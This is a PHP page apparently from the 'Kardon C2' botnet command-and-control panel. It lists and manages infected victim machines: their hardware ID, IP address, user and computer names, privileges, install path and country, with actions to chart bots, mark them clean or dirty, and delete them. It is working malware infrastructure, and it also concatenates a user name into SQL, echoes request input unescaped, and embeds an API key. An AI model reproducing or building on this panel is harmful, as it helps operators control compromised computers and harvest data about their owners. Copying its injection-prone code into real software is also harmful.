<?php
    include '../inc/session.php';
    include '../inc/stats.php';
    include '../inc/geo.php';
    $userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);  
?>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Kardon C2</title>
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="../img/android-desktop.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="../img/ios-desktop.png">
    <meta name="msapplication-TileImage" content="../img/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">
    <link rel="shortcut icon" href="../img/favicon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css">
    <link rel="stylesheet" href="../css/styles.css">
    <style>
    #view-source {
      position: fixed;
      display: block;
      right: 0;
      bottom: 0;
      margin-right: 40px;
      margin-bottom: 40px;
      z-index: 900;
    }
    </style>
    <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
        <script type="text/javascript">
        google.charts.load('current', {
        'packages':['geochart', 'corechart'],
        'mapsApiKey': 'AIzaSyAmjTDuWiy-V8RbMbtk1j6SbBm_hoNftBo'
        });
        google.charts.setOnLoadCallback(drawRegionsMap);
        google.charts.setOnLoadCallback(drawTopCountries);
        google.charts.setOnLoadCallback(drawTopOs);
        google.charts.setOnLoadCallback(drawTopPriv);
        function drawTopPriv()
        {
            var data = google.visualization.arrayToDataTable([
                ['privilege', 'Bots'],
                <?php
                $csel = $odb->query("SELECT privileges, COUNT(*) AS cnt FROM bots GROUP BY privileges ORDER BY cnt DESC");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart3'));
              chart.draw(data, options);
        }
        function drawTopOs()
        {
            var data = google.visualization.arrayToDataTable([
                ['Operating Sys', 'Bots'],
                <?php
                $csel = $odb->query("SELECT osversion, COUNT(*) AS cnt FROM bots GROUP BY osversion ORDER BY cnt DESC LIMIT 3");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart2'));
              chart.draw(data, options);
        }
        function drawTopCountries()
        {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Bots'],
                <?php
                $csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt DESC LIMIT 3");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart1'));
              chart.draw(data, options);
        }
        function drawRegionsMap() {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Bots'],
                <?php
                $csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
            ]);
            var options = {};
            var chart = new google.visualization.GeoChart(document.getElementById('regions_div'));
            chart.draw(data, options);
      }
    </script>
  </head>
  <body>
    <div class="demo-layout mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header">
      <header class="demo-header mdl-layout__header mdl-color--grey-100 mdl-color-text--grey-600">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">
          <?php
                $details = $odb->prepare("SELECT * FROM bots WHERE id = :id");
                $details->execute(array(":id" => $_GET['id']));
                $d = $details->fetch(PDO::FETCH_ASSOC);
                if ($d['mark'] == "1")
                {
                  echo 'This bot is marked as <font style="color: #4CAF50;">Clean</font>';
                }else{
                  echo 'This bot is marked as <font style="color: #F44336;">Dirty</font>';
                }
                ?>
          </span>
          <div class="mdl-layout-spacer"></div>
          <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" id="hdrbtn">
            <i class="material-icons">more_vert</i>
          </button>
          <ul class="mdl-menu mdl-js-menu mdl-js-ripple-effect mdl-menu--bottom-right" for="hdrbtn">
            <li onclick="location.href = 'account.php';" class="mdl-menu__item">Account</li>
            <li onclick="location.href = 'settings.php';"class="mdl-menu__item">Settings</li>
            <li onclick="location.href = '../inc/logout.php?logout';"class="mdl-menu__item">Logout</li>
          </ul>
        </div>
      </header>
      <div class="demo-drawer mdl-layout__drawer mdl-color--blue-grey-900 mdl-color-text--blue-grey-50">
      <header class="demo-drawer-header">
          <img src="../img/user.jpg" class="demo-avatar">
          <div class="demo-avatar-dropdown">
            <span><br /><?php echo $username; ?></span>
            <div class="mdl-layout-spacer"></div>
            <button id="accbtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
              <i class="material-icons" role="presentation">arrow_drop_down</i>
              <span class="visuallyhidden">Manage Users</span>
            </button>
            <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="accbtn">
              <li onclick="location.href = 'users.php';" class="mdl-menu__item">Manage Users</li>
            </ul>
          </div>
        </header>
        <nav class="demo-navigation mdl-navigation mdl-color--blue-grey-800">
        <a class="mdl-navigation__link" href="index.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dashboard</i>Dashboard</a>
        <a class="mdl-navigation__link" href="clients.php"> <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">computer</i>Clients</a>
          <a class="mdl-navigation__link" href="tasks.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">schedule</i>Tasks</a>
          <a class="mdl-navigation__link" href="logs.php">    <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">list</i>Logs</a>
        </nav>
      </div>
      <main class="mdl-layout__content mdl-color--grey-100">
        <div class="mdl-grid demo-content">
          <?php
            if (isset($_GET['id']))
            {
              if (!ctype_digit($_GET['id']))
              {
                echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><font style="color: #F44336;">Specified ID is not valid. Redirecting...</font></div><meta http-equiv="refresh" content="2;url=clients.php">';
                die();
              }else{
                $cnt = $odb->prepare("SELECT COUNT(*) FROM bots WHERE id = :id");
                $cnt->execute(array(":id" => $_GET['id']));
                if (!($cnt->fetchColumn(0) > 0))
                {
                  echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><font style="color: #F44336;">Specified ID was not found in database. Redirecting...</font></div><meta http-equiv="refresh" content="2;url=clients.php">';
                  die();
                }
              }
              if (isset($_GET['del']) && $_GET['del'] == "1")
              {
                $del = $odb->prepare("DELETE FROM bots WHERE id = :id LIMIT 1");
                $del->execute(array(":id" => $_GET['id']));
                $in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
                $in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted bot #'.$_GET['id']));
                echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col">Bot deleted <font style="color: #4CAF50;">successfully</font>. Redirecting...</div><meta http-equiv="refresh" content="2;url=bots.php">';
                die();
              }
              if (isset($_GET['mark']))
              {
                $m = $_GET['mark'];
                if ($m == "1")
                {
                  $mark = $odb->prepare("UPDATE bots SET mark = :mark WHERE id = :id LIMIT 1");
                  $mark->execute(array(":mark" => "1", ":id" => $_GET['id']));
                  echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>Bot Marked <font style="color: #4CAF50;">Successfully.</font></h6></center></div>';
                }elseif ($m == "2"){
                  $mark = $odb->prepare("UPDATE bots SET mark = :mark WHERE id = :id LIMIT 1");
                  $mark->execute(array(":mark" => "2", ":id" => $_GET['id']));
                  echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>Bot Marked <font style="color: #4CAF50;">Successfully.</font></h6></center></div>';
                }
              }
            }
          ?>
          <div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col">
            <center>
              <br>
              <br><br>
              <table class="mdl-data-table mdl-js-data-table mdl-data-table mdl-shadow--2dp">
                <thead>
                  <tr>
                    <th class="mdl-data-table__cell--non-numeric">Key</th>
                    <th width="50%">Value</th>
                  </tr>
                </thead>
                <tbody>
                  <tr><td class="mdl-data-table__cell--non-numeric">ID</td><td><?php echo $d['id']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">HWID</td><td><?php echo $d['hwid']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">IP Address</td><td><?php echo $d['ip']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">User Name</td><td><?php echo $d['username']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Computer Name</td><td><?php echo $d['computername']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Operating System</td><td><?php echo $d['osversion']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Privileges</td><td><?php echo $d['privileges']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Install Path</td><td><?php echo $d['installpath']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Architecture</td><td><?php echo $d['cpuarchitect']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Install Date</td><td><?php echo date("m-d-Y, h:i A", $d['installdate']); ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Last Response</td><td><?php echo date("m-d-Y, h:i A", $d['lastresponce']); ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Current Task</td><td>#<?php echo $d['currenttask']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Bot Type</td><td><?php echo $d['bottype']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Bot Version</td><td><?php echo $d['botversion']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">Country</td><td><?php echo countryCodeToCountry($d['country']); ?></td></tr>
                </tbody>
              </table>
              <br>
            </center>
          </div>
          <div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col">
            <center>
              <br>
              <?php
                if ($d['mark'] == "1")
                {
                  echo '<a class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-400" href="?p=details&id='.$_GET['id'].'&mark=2">Mark as dirty</a>';
                }else{
                  echo '<a class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--green-500" href="?p=details&id='.$_GET['id'].'&mark=1">Mark as clean</a>';
                }
                ?>
                <a href="?p=details&id=<?php echo $_GET['id']; ?>&del=1" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-400">Delete Bot</a>
              <br><br>
            </center>
          </div>
        </div>
      </main>
    </div>
    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
  </body>
</html>
